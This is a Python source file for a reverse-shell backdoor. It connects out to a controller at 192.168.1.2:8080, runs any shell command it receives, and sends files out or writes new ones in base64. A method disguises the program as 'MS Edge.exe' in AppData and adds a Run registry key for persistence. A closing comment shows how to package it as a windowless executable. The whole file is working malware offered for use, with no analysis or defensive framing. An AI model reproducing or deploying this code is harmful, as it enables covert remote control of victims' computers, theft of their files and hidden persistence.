import socket, subprocess, json, os, base64, sys, shutil

class Reverse_backdoor:
    def __init__(self, ip_address, port):
        #self.file_hide_from_user()
        try:
            self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.connection.connect((ip_address, port))
        except Exception:
            sys.exit()

    def file_hide_from_user(self):
        evil_file_loaction = os.environ["appdata"] + "\\MS Edge.exe"
        if not os.path.exists(evil_file_loaction):
            shutil.copyfile(sys.executable, evil_file_loaction)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v MS Edge /t REG_SZ /d "' + evil_file_loaction + '"', shell=True)
        else:
            pass

    def reliable_send(self, data):
        while True:
            try:
                json_data = json.dumps(data.decode())
                self.connection.send(json_data.encode('utf-8'))
                break
            except AttributeError:
                data = data.encode('utf-8')

    def reliable_recieve(self):
        json_data = "".encode('utf-8')
        while True:
            try:
                json_data = json_data + self.connection.recv(1024)
                return json.loads(json_data)

            except ValueError:
                continue

    def execute_system_command(self, command):
        try:
            DEVNULL = open(os.devnull, 'wb')
            return subprocess.check_output(command, shell=True, stderr=DEVNULL, stdin=DEVNULL)
        except subprocess.CalledProcessError:
            return "[+] Invalid System Command"

    def change_working_directory(self, path):
        try:
            os.chdir(path)
            return ("[+] Changed working directory to " + os.getcwd())
        except Exception as e:
            return ("[+] Unknown Directory")

    def read_file(self, path):
        try:
            with open(path, "rb") as file:
                return base64.b64encode(file.read())

        except Exception as e:
            if e == FileNotFoundError:
                return "[+] File Not Found"
            elif e == IsADirectoryError:
                return "[+] It's a directory"
            else:
                return "[+] Invalid File"

    def write_file(self, path, file_data):
        try:
            with open(path, "wb") as file:
                data = file_data.encode()
                file.write(base64.b64decode(data))
                return "[+] Upload Scuessfully"
        except Exception as e:
            os.remove(path)
            return "[+] File Not Found"


    def run(self):
        while True:
            command = self.reliable_recieve()
            if command[0] == "exit" or command[0] == "quit":
                self.connection.close()
                sys.exit()

            elif command[0] == "cd" and len(command)>1:
                command_result = self.change_working_directory(command[1])

            elif command[0] == "Download" or command[0] == "download":
                command_result = self.read_file(command[1])

            elif command[0] == "Uplaod" or command[0] == "upload":
                command_result = self.write_file(command[1], command[2])

            else:
                command_result = self.execute_system_command(command)

            self.reliable_send(command_result)





Backdoor = Reverse_backdoor("192.168.1.2", 8080)
Backdoor.run()

# "192.168.1.2", 8080
#pyinstaller.exe Reverse_Backdoor.py --onefile --noconsole  (to make it as an exe file)
